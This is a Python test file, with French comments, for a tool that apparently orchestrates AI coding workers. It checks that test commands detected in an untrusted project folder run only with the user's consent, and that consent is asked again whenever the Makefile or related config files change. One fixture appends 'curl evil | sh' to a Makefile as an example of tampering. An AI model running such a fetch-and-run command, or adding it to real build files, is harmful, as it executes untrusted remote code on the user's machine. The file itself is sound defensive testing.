"""Dossier de projet non fiable : la commande de vérification détectée (make test, npm test,
pytest…) exécute SON code — jamais sans ton accord ; et `claude auth`/`/usage` ne doivent pas
charger les réglages `.claude/` du dossier ouvert."""
import json
import os
import shutil
import tempfile
import threading
import unittest
from pathlib import Path
from unittest import mock

from orch.config import ConfigStore, Paths
from orch.detect import definition_sig, detect_verify
from orch.gui_controller import GuiController
from orch.procs import CmdResult
from orch.workers import WorkOutcome
from tests.test_engine import EngineCase

MAKEFILE = "check-fast:\n\techo ok\n"


class DetectSourcesTest(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(prefix="orch-consent-"))
        self.addCleanup(shutil.rmtree, self.dir, True)

    def test_detection_names_the_file_that_defines_the_command(self):
        (self.dir / "Makefile").write_text(MAKEFILE)
        self.assertEqual(detect_verify(self.dir), ("make check-fast", ("Makefile",)))

    def test_npm_and_pytest_sources(self):
        (self.dir / "package.json").write_text(json.dumps({"scripts": {"test": "jest"}}))
        self.assertEqual(detect_verify(self.dir), ("npm test", ("package.json",)))
        (self.dir / "package.json").unlink()
        (self.dir / "conftest.py").write_text("")
        self.assertEqual(detect_verify(self.dir), ("python3 -m pytest -q", ("conftest.py",)))

    def test_make_files_read_before_makefile_are_covered(self):
        # GNU make lit GNUmakefile, puis makefile, AVANT Makefile.
        (self.dir / "Makefile").write_text(MAKEFILE)
        sig = definition_sig(self.dir, "make check-fast")
        (self.dir / "GNUmakefile").write_text("check-fast:\n\techo EVIL\n")
        self.assertNotEqual(definition_sig(self.dir, "make check-fast"), sig)
        cmd, files = detect_verify(self.dir)
        self.assertEqual(cmd, "make check-fast")
        self.assertIn("GNUmakefile", files)

    def test_side_config_files_are_covered(self):
        for cmd, side in (("npm test", ".npmrc"), ("python3 -m pytest -q", "tox.ini"),
                          ("python3 -m pytest -q", "tests/conftest.py"), ("cargo test", ".cargo/config.toml")):
            with self.subTest(side=side):
                sig = definition_sig(self.dir, cmd)
                (self.dir / side).parent.mkdir(parents=True, exist_ok=True)
                (self.dir / side).write_text("x")
                self.assertNotEqual(definition_sig(self.dir, cmd), sig)

    def test_a_fifo_named_makefile_does_not_freeze_detection(self):
        os.mkfifo(str(self.dir / "Makefile"))
        out = {}
        th = threading.Thread(target=lambda: out.update(r=detect_verify(self.dir)), daemon=True)
        th.start()
        th.join(5)
        self.assertFalse(th.is_alive(), "detect_verify bloqué sur un FIFO")
        self.assertEqual(out["r"], ("", ()))

    def test_nothing_detected(self):
        self.assertEqual(detect_verify(self.dir), ("", ()))


class ConsentConfigTest(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(prefix="orch-consent-")).resolve()
        self.addCleanup(shutil.rmtree, self.dir, True)
        self.root = self.dir / "projet"
        self.root.mkdir()
        self.cfg = ConfigStore(Paths.for_root(self.root, self.dir / "logiciel"), lambda m: None)
        (self.root / "Makefile").write_text(MAKEFILE)

    def test_detected_command_waits_for_consent(self):
        self.assertEqual(self.cfg.effective_verify(self.root), ("", "pending"))
        status = self.cfg.verify_status(self.root)
        self.assertEqual((status.cmd, status.source, status.files), ("make check-fast", "pending", ("Makefile",)))

    def test_consent_lets_it_run(self):
        self.assertEqual(self.cfg.approve_verify(self.root, "make check-fast"), (True, ""))
        self.assertEqual(self.cfg.effective_verify(self.root), ("make check-fast", "detected"))

    def test_changed_definition_file_asks_again(self):
        self.cfg.approve_verify(self.root, "make check-fast")
        (self.root / "Makefile").write_text(MAKEFILE + "\tcurl evil | sh\n")
        self.assertEqual(self.cfg.effective_verify(self.root), ("", "changed"))

    def test_consent_for_another_command_is_refused(self):
        ok, err = self.cfg.approve_verify(self.root, "make test")
        self.assertFalse(ok)
        self.assertIn("make check-fast", err)
        self.assertEqual(self.cfg.effective_verify(self.root)[1], "pending")

    def test_consent_is_per_folder(self):
        self.cfg.approve_verify(self.root, "make check-fast")
        other = self.dir / "autre"
        other.mkdir()
        (other / "Makefile").write_text(MAKEFILE)
        self.assertEqual(self.cfg.effective_verify(other), ("", "pending"))

    def test_command_typed_by_the_user_needs_no_extra_consent(self):
        self.cfg.set_verify_cmd(self.root, "make check-fast")
        self.assertEqual(self.cfg.effective_verify(self.root), ("make check-fast", "custom"))


class EngineConsentTest(EngineCase):
    def setUp(self):
        super().setUp()
        self.workers.touch = self.dir
        (self.paths.root / "Makefile").write_text(MAKEFILE)
        self.ceo.chat_answers = [json.dumps({"reply": "Je m'en occupe.", "tasks": [
            {"title": "A", "worker": "opencode", "detail": "a"}]})]

    def test_detected_command_is_not_run_without_consent_and_it_is_said(self):
        self.engine().converse("Corrige A")
        self.assertEqual(self.workers.checks_run, [])
        self.assertTrue(self.said("NON lancée"), self.logs)
        self.assertTrue(self.said("Paramètres"), self.logs)

    def test_consented_command_runs(self):
        self.cfg.approve_verify(self.paths.root, "make check-fast")
        self.engine().converse("Corrige A")
        self.assertEqual(self.workers.checks_run, ["make check-fast"])

    def test_definition_changed_during_the_task_is_not_run(self):
        self.cfg.approve_verify(self.paths.root, "make check-fast")
        orig = self.workers.run

        def run_and_edit_makefile(*a, **kw):
            (self.paths.root / "Makefile").write_text(MAKEFILE + "\techo modifié\n")
            return orig(*a, **kw)
        self.workers.run = run_and_edit_makefile
        self.engine().converse("Corrige A")
        self.assertEqual(self.workers.checks_run, [])
        self.assertTrue(self.said("Makefile"), self.logs)


class ControllerConsentTest(unittest.TestCase):
    def setUp(self):
        self.root = Path(tempfile.mkdtemp(prefix="orch-gui-consent-")).resolve()
        self.addCleanup(shutil.rmtree, self.root, True)
        self.ctl = GuiController(self.root, dry_run=True,
                                 runner=lambda *a, **kw: CmdResult(0, "", ""))
        self.addCleanup(self.ctl.close, 5)

    def test_settings_show_pending_consent_then_approval(self):
        (self.root / "Makefile").write_text(MAKEFILE)
        s = self.ctl.state_view(0)["settings"]
        self.assertEqual((s["verify_effective"], s["verify_source"], s["verify_files"]),
                         ("make check-fast", "pending", ["Makefile"]))
        self.assertEqual(self.ctl.approve_verify("make check-fast"), (True, ""))
        self.assertEqual(self.ctl.state_view(0)["settings"]["verify_source"], "detected")

    def _cwd_of(self, call):
        with mock.patch("orch.gui_controller.run_cmd") as rc, \
                mock.patch.object(self.ctl, "dry_run", False):
            rc.return_value = CmdResult(0, json.dumps({"loggedIn": False}), "")
            call()
        return rc.call_args[1].get("cwd")

    def test_claude_account_commands_never_run_in_the_opened_folder(self):
        # Le dossier ouvert peut contenir un `.claude/settings.json` (hooks) : jamais chargé ici.
        ws = str(self.ctl.workspace_root)
        for call in (self.ctl.auth_status, self.ctl.usage_status, self.ctl.auth_logout):
            with self.subTest(call=call.__name__):
                cwd = self._cwd_of(call)
                self.assertEqual(cwd, str(Path.home()))
                self.assertNotEqual(cwd, ws)


if __name__ == "__main__":
    unittest.main()
